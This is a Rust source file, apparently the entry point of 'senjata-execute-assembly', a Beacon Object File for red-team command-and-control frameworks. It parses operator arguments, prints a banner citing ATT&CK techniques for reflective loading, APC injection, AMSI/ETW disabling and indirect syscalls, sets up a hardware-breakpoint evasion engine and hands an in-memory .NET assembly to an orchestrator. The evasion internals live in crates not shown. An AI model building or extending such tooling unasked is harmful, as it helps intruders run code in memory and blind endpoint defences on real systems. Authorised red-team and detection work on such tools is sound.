//! Senjata-Execute-Assembly BOF — inline-mode entry point. Most logic
//! lives in `clr-orchestrator`; this crate handles args parsing and the
//! rustbof-driven main entry.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(all(target_os = "windows", feature = "diag-log"))]
mod debug_log;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        #[cfg(feature = "diag-log")]
        {
            debug_log::log(b"--------------------------------------");
            debug_log::log(b"[bof] main entered");
            debug_log::log_hex(b"[bof]   raw args len=", len as u32);
        }
        match run(args, len) {
            Ok(()) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof] run() returned Ok");
                rustbof::eprintln!("[+] senjata-execute-assembly finished")
            }
            Err(e) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof] run() returned Err");
                rustbof::eprintln!("[-] {}", e.format())
            }
        }
        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] main returning");
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;

    #[cfg(feature = "diag-log")]
    debug_log::log(b"[bof] step 1: args::parse");
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    #[cfg(feature = "diag-log")]
    {
        debug_log::log(b"[bof]   args::parse ok");
        debug_log::log_hex(b"[bof]   app_domain.len=", a.app_domain.len() as u32);
        debug_log::log_hex(b"[bof]   amsi=", a.amsi as u32);
        debug_log::log_hex(b"[bof]   etw=", a.etw as u32);
        debug_log::log_hex(b"[bof]   mailslot=", a.mailslot as u32);
        debug_log::log_hex(b"[bof]   entry_point=", a.entry_point);
        debug_log::log_hex(b"[bof]   mode=", a.mode);
        debug_log::log_hex(b"[bof]   asm_bytes.len=", a.asm_bytes.len() as u32);
        debug_log::log_hex(b"[bof]   asm_args.len=", a.asm_args.len() as u32);
    }

    // Operator-visible banner. Same content as senjata-runner's banner
    // so credit + MITRE mapping is identical regardless of --inline vs
    // sacrificial dispatch.
    rustbof::eprintln!("[senjata] senjata-execute-assembly v0.4.2  -  Created by DAP");
    rustbof::eprintln!(
        "[senjata] MITRE ATT&CK: T1620 (Reflective Code Loading) | T1055.004 (APC Injection) | T1562.001 (Disable AMSI/ETW) | T1106 (Indirect Syscalls)"
    );
    #[cfg(feature = "diag-log")]
    debug_log::log(b"[bof]   banner emitted");

    unsafe {
        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 2: HwbpEngine::init");
        let engine = opsec_hwbp::HwbpEngine::init()
            .map_err(|e| BofError::Orchestrator(
                clr_orchestrator::OrchestratorError::Hwbp(e)
            ))?;
        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof]   HwbpEngine::init ok");

        #[cfg(feature = "diag-log")]
        unsafe extern "C" fn diag_thunk(msg: *const u8, len: usize) {
            unsafe {
                let slice = core::slice::from_raw_parts(msg, len);
                debug_log::log(slice);
            }
        }

        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 3: building OrchestrateInput");
        let input = clr_orchestrator::OrchestrateInput {
            app_domain: &a.app_domain,
            amsi: a.amsi,
            etw: a.etw,
            mailslot: a.mailslot,
            entry_point: a.entry_point,
            slot_name: &a.slot_name,
            pipe_name: &a.pipe_name,
            asm_args: &a.asm_args,
            mode: a.mode,
            main_name: &a.main_name,
            asm_bytes: &a.asm_bytes,
            #[cfg(feature = "diag-log")]
            log_fn: Some(diag_thunk),
            #[cfg(not(feature = "diag-log"))]
            log_fn: None,
        };

        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 4: orchestrate() call");
        let r = clr_orchestrator::orchestrate(&input, &engine);
        #[cfg(feature = "diag-log")]
        {
            match &r {
                Ok(()) => debug_log::log(b"[bof]   orchestrate returned Ok"),
                Err(_) => debug_log::log(b"[bof]   orchestrate returned Err"),
            }
        }
        r?;

        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 5: dropping HwbpEngine");
        drop(engine);
        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof]   HwbpEngine dropped");
    }
    Ok(())
}
